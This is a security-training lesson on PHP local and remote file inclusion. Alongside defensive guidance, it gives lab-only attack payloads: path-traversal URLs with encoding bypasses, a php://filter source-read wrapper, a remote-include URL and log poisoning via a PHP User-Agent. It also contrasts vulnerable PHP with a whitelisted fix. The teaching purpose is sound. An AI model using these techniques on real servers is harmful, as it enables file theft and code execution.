---
schema_version: 1
id: WEB-A05-LFI-RFI
title: "Local/Remote File Inclusion (LFI/RFI)"
slug: lfi-rfi
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
  - A08:2025
cwe:
  - CWE-98
  - CWE-829
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Local/Remote File Inclusion (LFI/RFI)

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain Local/Remote File Inclusion (LFI/RFI) by root cause instead of only describing the consequences.
- Identify trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited.
- Conduct controlled testing in a local lab and distinguish expected results from false positives.
- Select root controls, implement fixes, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Understand the HTTP request/response flow of Local/Remote File Inclusion scenarios (LFI/RFI) and how to apply input handling across trust boundaries.
- Distinguish between authentication, authorization, and validation.
- Be able to read code/configuration in the language or framework shown in the example.
- Have a local isolated lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

To make websites operate flexibly, programmers often use the dynamic file inclusion feature. Imagine this feature like building an empty picture frame on the website, and depending on the user's choice (for example: choosing English or Vietnamese), the application will load the corresponding image or file into that frame. In the PHP language, functions like `include` or `require` are used to perform this. If loading files that already exist on your server, it is called local file inclusion (LFI). If loading files from another internet address, it is called remote file inclusion (RFI).

```php
<?php
// Normal usage — loading language file based on user preference
$lang = $_GET['lang'];       // e.g., "en", "vi", "fr"
include("languages/" . $lang . ".php");
// Loads languages/en.php, languages/vi.php, etc.
?>
```
Similarly, Python has `importlib`, Java has `ClassLoader`, but PHP is the main target because `include()` **executes file content** — regardless of origin.

**LFI (Local File Inclusion)**: Include file from the local server system.
**RFI (Remote File Inclusion)**: Include file from external URL (requires `allow_url_include=On` in php.ini).

## 4. Description and Root Cause

File Inclusion vulnerabilities occur when an application allows input to determine the local file or remote resource to be included in the include mechanism. With local inclusion, a relative path segment or an overly broad file mapping can lead the reading process to go outside the allowed template set. With remote inclusion, the impact also depends on the runtime and whether the configuration permits including URL or not; code execution should not be assumed solely from the ability to read files. Harmless local payloads and remote configuration conditions are separated in Section 8. [S2] [S3]

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** allowed template/locale and container filesystem. 
- **Actor, authentication and role:** user role selects page/locale; no filesystem permissions.
- **Exploitation conditions:** path/URL from client goes into include without going through fixed resource mapping.
- **Browser, proxy, framework and version:** PHP 8.2/Apache 2.4 container, clearly note allow_url_include status; loopback; must record actual image/package version along with evidence.
- **Mandatory evidence:** together with correlation ID must link input, decision control, and impact on the correct asset; individual status code is not enough. [S1]

## 6. Attack Mechanism

For LFI RFI, path/URL from the client goes into include without going through a fixed resource mapping. The positive case must demonstrate that the input reaches the correct sink and creates the described impact; the negative case, when root control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch PHP 8.2/Apache 2.4 container, clearly note the allow_url_include status; loopback; only load aggregated data, enable application/proxy/datastore logs, and attach correlation ID.  
2. **Baseline:** send a valid input for the LFI/RFI use case; save raw request/response, decide on policy and asset status before testing.  
3. **Input and actions:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and abide by the request cap.  
4. **Expected result:** consider a vulnerable fixture positive only when logs prove the mechanism “path/URL from client enters include without going through fixed resource mapping”; secure fixture must block before side effect and boundary input must fail closed.  
5. **Cleanup:** delete data, markers, and logs of LFI/RFI; revoke related session/cache, revert snapshot, and confirm no callback/test process remains.  
6. **Safety limitations:** run only on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

**LFI — Path Traversal to read system files**:

<!-- payload-id: WEB-A05-LFI-RFI-001 -->
<!-- context: PHP 8.3 local file-include fixture with /fixtures/lab-marker.txt -->
<!-- prerequisites: synthetic fixture files only; container filesystem isolated from the host -->
<!-- encoding: path separators are literal for baseline; double-encoded case is decoded by each documented fixture layer exactly once -->
<!-- expected-result: response contains LAB_FILE_MARKER from the synthetic fixture file -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Basic traversal to a synthetic file mounted by the fixture
https://victim.lab.test/page.php?file=../../../../fixtures/lab-marker.txt

# Historical null-byte variant: only relevant to PHP versions before 5.3.4
https://victim.lab.test/page.php?file=../../../../fixtures/lab-marker.txt%00

# Double encoding to bypass basic filters
https://victim.lab.test/page.php?file=..%252f..%252f..%252ffixtures%252flab-marker.txt
```
**PHP Wrappers — Read source code in Base64 format**:

<!-- payload-id: WEB-A05-LFI-RFI-002 -->
<!-- context: PHP 8.3 php://filter read-only fixture -->
<!-- prerequisites: config.php contains synthetic values only; allow_url_include is disabled -->
<!-- encoding: wrapper URI is UTF-8 and query-encoded once; slash and colon remain in the decoded file parameter -->
<!-- expected-result: response is Base64 that decodes to the synthetic config marker -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# php://filter wrapper to read source code without executing it
https://victim.lab.test/page.php?file=php://filter/convert.base64-encode/resource=config.php
# The fixture returns Base64-encoded synthetic config content.
```
**RFI — include content PHP from local mock server**:

<!-- payload-id: WEB-A05-LFI-RFI-003 -->
<!-- context: legacy PHP fixture with allow_url_include enabled and a local mock HTTP server -->
<!-- prerequisites: rfi-fixture.lab.test resolves to loopback; no outbound network -->
<!-- encoding: absolute HTTP URL is percent-encoded once as the file query value; mock body is UTF-8 PHP -->
<!-- expected-result: response contains RFI_LAB from the local mock file; no command is executed -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# The local mock serves: <?php echo 'RFI_LAB'; ?>

https://victim.lab.test/page.php?file=http://rfi-fixture.lab.test/lab.txt
# The vulnerable fixture fetches and evaluates the mock PHP content.
```

**LFI + Log Poisoning**:

<!-- payload-id: WEB-A05-LFI-RFI-004 -->
<!-- context: Apache/PHP disposable fixture includes its synthetic access log after one marker request -->
<!-- prerequisites: lab access log mounted inside container; User-Agent marker has no filesystem/network operation; two requests total -->
<!-- encoding: curl sends UTF-8 User-Agent; traversal path is query-encoded once and resolves only inside container -->
<!-- expected-result: vulnerable include prints LOG_POISONING_LAB; secure resource mapping never opens the access log -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Step 1: Put a harmless marker expression in the disposable access log.
curl -A "<?php echo 'LOG_POISONING_LAB'; ?>" https://victim.lab.test/

# Step 2: Include the poisoned log file
https://victim.lab.test/page.php?file=../../../../var/log/apache2/access.log
```

## 9. Vulnerable Code and Secure Code

```php
<?php
// === VULNERABLE CODE ===
$page = $_GET['page'];
// DANGER: User input directly controls file inclusion
include("templates/" . $page);


// === SECURE CODE ===

// Whitelist of allowed pages
$allowed_pages = [
    'home'    => 'home.php',
    'about'   => 'about.php',
    'contact' => 'contact.php',
];

$page = $_GET['page'] ?? 'home';

// Only include files from the predefined whitelist
if (array_key_exists($page, $allowed_pages)) {
    $safe_path = __DIR__ . '/templates/' . $allowed_pages[$page];

    // Verify resolved path is within templates directory
    $real_path = realpath($safe_path);
    $base_dir  = realpath(__DIR__ . '/templates/');

    if ($real_path && strpos($real_path, $base_dir) === 0) {
        include($real_path);
    } else {
        http_response_code(403);
        echo "Access denied";
    }
} else {
    http_response_code(404);
    echo "Page not found";
}
?>
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to Local/Remote File Inclusion (LFI/RFI), policy results, and correlation ID; do not log secrets or entire tokens. 
- Compare authorization/validation failures with a valid baseline and alert according to behavior chains, not just a single payload chain. 
- Combine telemetry from the application, reverse proxy, and datastore to confirm that the request reached the sink and whether it had any impact. 
- Scanner or WAF alerts are only investigation signals; they are not the sole evidence that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Map ID business to a fixed file, check canonical containment, and disable remote include.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

With Local/Remote File Inclusion (LFI/RFI), the measures below help reduce blast radius or increase detection capability. Rate limit, UUID hard to guess, WAF, CSP, or general validation should not be used to replace original control.

- **Summary**: Limit the use of user data to route file paths, configure disabling of features including remote files, and control directory access.  
- **Detailed steps**:  
  - Whitelist file names: Only allow includes from a predefined list of files, do not use direct user input.  
  - Disable `allow_url_include`: Turn off in php.ini to completely prevent RFI.  
  - Do not rely on `basename()` to prove containment; map ID to a fixed template or resolve canonical then check allowed directory.  
  - `open_basedir` restriction: Limit PHP to access files only within the application directory.  
  - Switch to template engine: Use Twig, Blade instead of directly using `include()`.

## 12. Retest

- **Positive case:** for Local/Remote File Inclusion (LFI/RFI), the valid flow still works correctly for the actor and permitted data.  
- **Negative case:** the same input/resource but an unauthorized actor or context is denied without leaking sensitive details.  
- **Boundary case:** check empty values, edge cases, different encodings, repeated requests, expired session states, and equivalent paths/operations.  
- **Telemetry:** confirm policy decisions, application logs, proxy logs, and datastore side effects match correlation ID.  
- **Re-test:** save the minimal scenario to reproduce the old issue and demonstrate that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of Local/Remote File Inclusion (LFI/RFI) without confirming side effects and logs.  
- Use a payload with correct syntax but wrong DBMS, browser, framework, protocol, or injection context.  
- Treat UUID, rate limit, WAF, CSP, or general input validation as a fix for another root control.  
- Only fix one route while the same sink/policy is used on another route.  
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **LFI (Local File Inclusion)**: Vulnerability to include local files from the application's server.
- **RFI (Remote File Inclusion)**: Vulnerability to include remote files from an external server through URL.
- **Log Poisoning**: Technique of injecting malicious code into log files and then using LFI to execute that code.
- **Web Shell**: Malicious file that allows an attacker to control the server through a web interface.
- **Directory Traversal**: Technique to make a resolved path escape from the directory that the function is allowed to access.

## 16. Related Lessons and Further Reading

- [File Upload](../../06-insecure-design/file-upload/) — Uploading malicious files is a common vector to combine with and exploit Local File Inclusion vulnerability (LFI).

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/file-path-traversal — version/status: current version; accessed: 2026-07-17.  
- **[S2]** OWASP WSTG — Testing for File Inclusion. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion — version/status: latest; accessed: 2026-07-17.  
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/98.html — version/status: current version; accessed: 2026-07-17.  
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-17.  
- **[S5]** CWE-829. https://cwe.mitre.org/data/definitions/829.html — version/status: current version; accessed: 2026-07-17.